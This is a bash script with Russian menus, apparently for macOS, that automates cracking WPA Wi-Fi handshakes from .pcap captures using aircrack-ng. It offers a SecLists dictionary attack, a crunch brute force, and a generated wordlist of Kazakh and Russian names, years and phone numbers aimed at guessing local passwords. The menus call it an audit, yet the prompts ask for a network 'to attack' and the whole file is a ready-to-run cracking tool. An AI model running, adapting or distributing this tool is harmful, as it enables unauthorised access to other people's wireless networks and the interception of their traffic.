#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

printf "\e[8;40;120t"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

CAPTURE_SOURCE_DIR="/var/tmp"
LOCAL_CAPTURE="$PROJECT_DIR/wifi_capture.pcap"
MEGA_WORDLIST="$HOME/SecLists/Combined/mega_wifi_wordlist.txt"
CRUNCH_WORDLIST="$PROJECT_DIR/config/crunch_generated_wordlist.txt"

mkdir -p "$PROJECT_DIR/config"

function clear_screen {
	clear -x
	printf "\033[H\033[2J"
}

function show_banner {
	echo -e "${BLUE}"
	echo -e "██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀    █     █░ ██▓  █████▒██▓"
	echo -e "▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒    ▓█░ █ ░█░▓██▒▓██   ▒▓██▒"
	echo -e "▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▒█░ █ ░█ ▒██▒▒████ ░▒██▒"
	echo -e "░▓█ ░██ ░██▄▄▄▄██  ▒▓▓▄ ▄██▒▓██ █▄    ░█░ █ ░█ ░██░░▓█▒  ░░██░"
	echo -e "░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ░░██▒██▓ ░██░░▒█░   ░██░"
	echo -e " ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▓░▒ ▒  ░▓   ▒ ░   ░▓  "
	echo -e " ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░     ▒ ░ ░   ▒ ░ ░      ▒ ░"
	echo -e " ░  ░░ ░  ░   ▒   ░        ░ ░░ ░      ░   ░   ▒ ░ ░ ░    ▒ ░"
	echo -e " ░  ░  ░      ░  ░░ ░      ░  ░          ░     ░          ░  "
	echo -e "  █████▒▒█████   ██▀███      ███▄ ▄███▓ ▄▄▄       ▄████▄     "
	echo -e "▓██   ▒▒██▒  ██▒▓██ ▒ ██▒   ▓██▒▀█▀ ██▒▒████▄    ▒██▀ ▀█     "
	echo -e "▒████ ░▒██░  ██▒▓██ ░▄█ ▒   ▓██    ▓██░▒██  ▀█▄  ▒▓█    ▄    "
	echo -e "░▓█▒  ░▒██   ██░▒██▀▀█▄     ▒██    ▒██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒   "
	echo -e "░▒█░   ░ ████▓▒░░██▓ ▒██▒   ▒██▒   ░██▒ ▓█   ▓██▒▒ ▓███▀ ░   "
	echo -e " ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░   ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░   "
	echo -e " ░       ░ ▒ ▒░   ░▒ ░ ▒░   ░  ░      ░  ▒   ▒▒ ░  ░  ▒      "
	echo -e " ░ ░   ░ ░ ░ ▒    ░░   ░    ░      ░     ░   ▒   ░           "
	echo -e "           ░ ░     ░               ░         ░  ░░ ░         "
	echo -e "                                                 ░           "
	echo -e "     by Googleee v 0.1           tg: @specguard              "
	echo -e "${NC}"
}

function show_info {
	clear_screen
	show_banner
	echo -e "${BLUE}==================================================${NC}"
	echo -e "${YELLOW}ℹ️  ИНФОРМАЦИЯ И РЕКОМЕНДАЦИИ ПО АУДИТУ:${NC}"
	echo -e "  1. Зафиксируйте карту на канале сети через Сниффер Mac."
	echo -e "  2. Переподключите устройство для захвата хэндшейка."
	echo -e "  3. Файлы сохраняются автоматически в директорию поиска."
	echo -e "  4. Комбайн обрабатывает файлы локально внутри проекта."
	echo -e "${BLUE}==================================================${NC}"
	read -p "Нажмите Enter для возврата в Главное меню..."
	clear_screen
}

function menu_settings {
	while true; do
		clear_screen
		echo -e "${BLUE}==================================================${NC}"
		echo -e "${YELLOW}                 НАСТРОЙКИ ДИРЕКТОРИЙ             ${NC}"
		echo -e "${BLUE}==================================================${NC}"
		echo -e "  [${GREEN}1${NC}] Папка поиска .pcap дампов:  ${YELLOW}$CAPTURE_SOURCE_DIR${NC}"
		echo -e "  [${GREEN}2${NC}] Путь к Мега-Словарю:        ${YELLOW}$MEGA_WORDLIST${NC}"
		echo -e "  [${GREEN}3${NC}] Путь сохранения Crunch:     ${YELLOW}$CRUNCH_WORDLIST${NC}"
		echo -e "  [${BLUE}b${NC}] Вернуться в главное меню"
		echo -e "${BLUE}==================================================${NC}"
		echo ""
		read -p "Выберите параметр для изменения (1/2/3/b): " SET_CHOICE

		if [[ "$SET_CHOICE" == "b" || "$SET_CHOICE" == "B" ]]; then
			clear_screen
			return
		fi

		case "$SET_CHOICE" in
		1)
			echo ""
			read -e -p "Введите новый путь к папке с дампами: " NEW_PATH
			if [ -d "$NEW_PATH" ]; then
				CAPTURE_SOURCE_DIR="$NEW_PATH"
				echo -e "${GREEN}[✓] Путь изменен.${NC}"
			else
				echo -e "${RED}[X] Ошибка: Директория не существует.${NC}"
			fi
			sleep 2
			;;
		2)
			echo ""
			read -e -p "Введите новый полный путь к Мега-Словарю (.txt): " NEW_PATH
			MEGA_WORDLIST="$NEW_PATH"
			echo -e "${GREEN}[✓] Путь изменен.${NC}"
			sleep 2
			;;
		3)
			echo ""
			read -e -p "Введите новый полный путь для словарей Crunch (.txt): " NEW_PATH
			CRUNCH_WORDLIST="$NEW_PATH"
			echo -e "${GREEN}[✓] Путь изменен.${NC}"
			sleep 2
			;;
		*)
			echo -e "${RED}Неверный выбор.${NC}"
			sleep 1
			;;
		esac
	done
}

function clean_project_files {
	clear_screen
	echo -e "${RED}==================================================${NC}"
	echo -e "${RED}               ОЧИСТКА СИСТЕМНЫХ ФАЙЛОВ           ${NC}"
	echo -e "${RED}==================================================${NC}"
	echo -e "${YELLOW}[!] Выберите режим очистки:${NC}"
	echo ""
	echo -e "  [${GREEN}1${NC}] Очистить только файлы проекта (дамп и словари)"
	echo -e "  [${RED}2${NC}] Полная очистка (файлы проекта + ВСЕ дампы сниффера в директории поиска)"
	echo -e "  [${BLUE}b${NC}] Назад в главное меню"
	echo -e "${RED}==================================================${NC}"
	read -p "Ваш выбор (1/2/b): " CLEAN_MODE

	if [[ "$CLEAN_MODE" == "b" || "$CLEAN_MODE" == "B" ]]; then
		clear_screen
		return
	fi

	if [[ "$CLEAN_MODE" == "1" ]]; then
		echo ""
		echo -e "${YELLOW}[*] Удаление локальных файлов...${NC}"
		rm -f "$LOCAL_CAPTURE"
		rm -f "$CRUNCH_WORDLIST"
		echo -e "${GREEN}[✓] Файлы проекта успешно удалены.${NC}"
		sleep 2
		clear_screen
	elif [[ "$CLEAN_MODE" == "2" ]]; then
		echo ""
		echo -e "${YELLOW}[*] Удаление локальных файлов...${NC}"
		rm -f "$LOCAL_CAPTURE"
		rm -f "$CRUNCH_WORDLIST"
		echo -e "${RED}[!] Требуются права администратора для очистки папки $CAPTURE_SOURCE_DIR${NC}"
		sudo rm -f "$CAPTURE_SOURCE_DIR"/*.pcap 2>/dev/null
		echo -e "${GREEN}[✓] Все файлы и системные дампы успешно удалены.${NC}"
		sleep 2
		clear_screen
	else
		echo -e "${RED}Неверный режим.${NC}"
		sleep 2
		clear_screen
	fi
}

function menu_main {
	while true; do
		clear_screen
		show_banner

		echo -e "${YELLOW}                 ВЫБОР ФУНКЦИЙ:                   ${NC}"
		echo -e "${BLUE}==================================================${NC}"
		echo -e "  [${GREEN}1${NC}] Перейти к выбору файла Wi-Fi захвата и начать аудит"
		echo -e "  [${YELLOW}2${NC}] Перейти в меню очистки временных файлов"
		echo -e "  [${BLUE}3${NC}] Показать информацию и рекомендации по аудиту"
		echo -e "  [${GREEN}4${NC}] Настройки директорий и путей данных"
		echo -e "  [${RED}q${NC}] Выйти из комбайна"
		echo -e "${BLUE}==================================================${NC}"
		echo ""
		read -p "Выберите действие (1/2/3/4/q): " MAIN_CHOICE

		if [[ "$MAIN_CHOICE" == "q" || "$MAIN_CHOICE" == "Q" ]]; then
			clear_screen
			exit 0
		fi
		if [[ "$MAIN_CHOICE" == "2" ]]; then
			clean_project_files
			continue
		fi
		if [[ "$MAIN_CHOICE" == "3" ]]; then
			show_info
			continue
		fi
		if [[ "$MAIN_CHOICE" == "4" ]]; then
			menu_settings
			continue
		fi
		if [[ "$MAIN_CHOICE" == "1" ]]; then
			menu_select_file
			continue
		fi

		echo -e "${RED}Ошибка: Неверный выбор.${NC}"
		sleep 1
	done
}

function menu_select_file {
	while true; do
		clear_screen
		echo -e "${BLUE}==================================================${NC}"
		echo -e "${YELLOW}[Шаг 1/2] Выберите файл захвата в системе:${NC}"
		echo -e "${BLUE}==================================================${NC}"
		echo ""

		IFS=$'\n' files=($(ls -t "$CAPTURE_SOURCE_DIR"/*.pcap 2>/dev/null))

		echo -e "${BLUE}Доступные файлы беспроводной диагностики:${NC}"
		echo -e "${BLUE}==================================================${NC}"

		if [ ${#files[@]} -eq 0 ]; then
			echo -e "  ${RED}[X] Файлы сниффера .pcap не найдены в папке $CAPTURE_SOURCE_DIR${NC}"
		else
			for i in "${!files[@]}"; do
				filename=$(basename "${files[$i]}")
				filedate=$(stat -f "%Sm" -t "%Y-%m-%d %H:%M:%S" "${files[$i]}")
				echo -e "  [${GREEN}$((i + 1))${NC}] $filename  (${YELLOW}$filedate${NC})"
			done
		fi

		echo -e "${BLUE}==================================================${NC}"
		echo -e "  [${BLUE}b${NC}] Вернуться назад в Главное меню"
		echo -e "${BLUE}==================================================${NC}"

		echo ""
		read -p "Введите НОМЕР файла для анализа: " FILE_INDEX
		if [[ "$FILE_INDEX" == "b" || "$FILE_INDEX" == "B" ]]; then
			clear_screen
			return
		fi

		if [ ${#files[@]} -eq 0 ]; then
			echo -e "${RED}Ошибка: Список файлов пуст. Сначала запишите дамп через сниффер Mac.${NC}"
			sleep 2
			continue
		fi
		if ! [[ "$FILE_INDEX" =~ ^[0-9]+$ ]] || [ "$FILE_INDEX" -lt 1 ] || [ "$FILE_INDEX" -gt ${#files[@]} ]; then
			echo -e "${RED}Ошибка: Неверный номер файла.${NC}"
			sleep 2
			continue
		fi
		SELECTED_FILE="${files[$FILE_INDEX - 1]}"
		cp "$SELECTED_FILE" "$LOCAL_CAPTURE"
		menu_analyze_networks
	done
}
function menu_analyze_networks {
	while true; do
		clear_screen
		echo -e "${BLUE}==================================================${NC}"
		echo -e "  ${GREEN}[✓] Выбран файл: $(basename "$SELECTED_FILE")${NC}"
		echo -e "${BLUE}==================================================${NC}"
		echo -e "${YELLOW}[Шаг 2/2] Список доступных хэндшейков для взлома:${NC}"
		echo ""
		TMP_LOG=$(mktemp)
		aircrack-ng "$LOCAL_CAPTURE" </dev/null >"$TMP_LOG" 2>&1
		grep -E "Index number|#  BSSID" "$TMP_LOG"
		echo -e "${BLUE}==================================================${NC}"
		grep -E "^[[:space:]]*[0-9]+" "$TMP_LOG" | grep -i "handshake" | grep -v "0 handshake"
		IFS=$'\n' network_lines=($(grep -E "^[[:space:]]*[0-9]+" "$TMP_LOG" | grep -i "handshake" | grep -v "0 handshake"))
		rm -f "$TMP_LOG"
		echo -e "${BLUE}==================================================${NC}"
		echo -e "Чтобы вернуться назад, введите букву ${RED}b${NC}."
		echo -e "${BLUE}==================================================${NC}"
		echo ""
		read -p "Введите Index number сети для атаки: " TARGET_INDEX
		if [[ "$TARGET_INDEX" == "b" || "$TARGET_INDEX" == "B" ]]; then return; fi
		TARGET_BSSID=""
		for line in "${network_lines[@]}"; do
			clean_line=$(echo "$line" | sed 's/^[[:space:]]*//')
			idx=$(echo "$clean_line" | awk '{print $1}')
			if [ "$idx" -eq "$TARGET_INDEX" ]; then
				TARGET_BSSID=$(echo "$clean_line" | awk '{print $2}')
				break
			fi
		done
		if [ -z "$TARGET_BSSID" ]; then
			echo -e "${RED}Ошибка: Неверный числовой индекс сети.${NC}"
			sleep 2
			continue
		fi
		clear_screen
		echo -e "${BLUE}==================================================${NC}"
		echo -e "${YELLOW}               ВЫБЕРИТЕ РЕЖИМ АТАКИ               ${NC}"
		echo -e "${BLUE}==================================================${NC}"
		echo -e "  [${GREEN}1${NC}] Умный Мега-Словарь (SecLists + KZ сегмент)"
		echo -e "  [${RED}2${NC}] Тотальный Crunch-брутфорс (Оптимизированный, 8 символов)"
		echo -e "  [${YELLOW}3${NC}] Расширенный маска-брутфорс до 32 символов (В ФАЙЛ)"
		echo -e "  [${BLUE}b${NC}] Вернуться назад к списку сетей"
		echo -e "${BLUE}==================================================${NC}"
		read -p "Ваш выбор (1/2/3/b): " ATTACK_MODE
		if [[ "$ATTACK_MODE" == "b" || "$ATTACK_MODE" == "B" ]]; then continue; fi
		if [[ "$ATTACK_MODE" == "1" ]]; then
			clear_screen
			echo -e "${YELLOW}[🚀] Запуск перебора по Умному Мега-Словарю...${NC}\n"
			if [ ! -f "$MEGA_WORDLIST" ]; then MEGA_WORDLIST="$HOME/SecLists/Passwords/Common-Credentials/10k-most-common.txt"; fi
			aircrack-ng -b "$TARGET_BSSID" -w "$MEGA_WORDLIST" "$LOCAL_CAPTURE"
		elif [[ "$ATTACK_MODE" == "2" ]]; then
			clear_screen
			echo -e "${RED}[🔥] РЕЖИМ 2: ОПТИМИЗИРОВАННЫЙ ТОТАЛЬНЫЙ БРУТФОРС...${NC}"
			echo -e "${YELLOW}[!] Создаем безопасный Crunch-словарь...${NC}\n"
			crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -t @@@@@123 -o "$CRUNCH_WORDLIST"
			clear_screen
			echo -e "${BLUE}==================================================${NC}"
			echo -e "${YELLOW}[🚀] Запуск проверки в Aircrack-ng...${NC}"
			echo -e "${BLUE}==================================================${NC}\n"
			aircrack-ng -b "$TARGET_BSSID" -w "$CRUNCH_WORDLIST" "$LOCAL_CAPTURE"
		elif [[ "$ATTACK_MODE" == "3" ]]; then
			clear_screen
			echo -e "${YELLOW}[🔥] РЕЖИМ 3: ГЕНЕРАЦИЯ ДЛИННЫХ МАСОК (ДО 32 СИМВОЛОВ)...${NC}"
			echo -e "${YELLOW}[!] Сборка длинных комбинаций в файл словаря...${NC}\n"
			>"$CRUNCH_WORDLIST"
			names=(Maksim Marat Murat Ruslan Sultan Alikhan Shynar Aruzhan Asel Максим Марат Мурат)
			surnames=(Akhmetov Omarov Ivanov Askarov Maratov)
			for n in "${names[@]}"; do
				low_n=$(echo "$n" | tr '[:upper:]' '[:lower:]')
				for s in "${surnames[@]}"; do
					low_s=$(echo "$s" | tr '[:upper:]' '[:lower:]')
					for y in {1980..2026}; do
						echo "$n$s$y" >>"$CRUNCH_WORDLIST"
						echo "$low_n$low_s$y" >>"$CRUNCH_WORDLIST"
						echo "${n}${s}${y}" >>"$CRUNCH_WORDLIST"
					done
				done
				echo "${n}87011234567" >>"$CRUNCH_WORDLIST"
				echo "${low_n}+77777777777" >>"$CRUNCH_WORDLIST"
			done
			echo "12345678123456781234567812345678" >>"$CRUNCH_WORDLIST"
			echo "qwertyuiopasdfghjklzxcvbnm123456" >>"$CRUNCH_WORDLIST"
			clear_screen
			echo -e "${BLUE}==================================================${NC}"
			echo -e "${YELLOW}[🚀] Запуск проверки в Aircrack-ng...${NC}"
			echo -e "${BLUE}==================================================${NC}\n"
			aircrack-ng -b "$TARGET_BSSID" -w "$CRUNCH_WORDLIST" "$LOCAL_CAPTURE"
		else
			echo -e "${RED}Неверный режим.${NC}"
			sleep 2
			continue
		fi
		echo ""
		echo -e "${YELLOW}Действие завершено.${NC}"
		read -p "Нажмите Enter для возврата к списку сетей..."
	done
}
menu_main
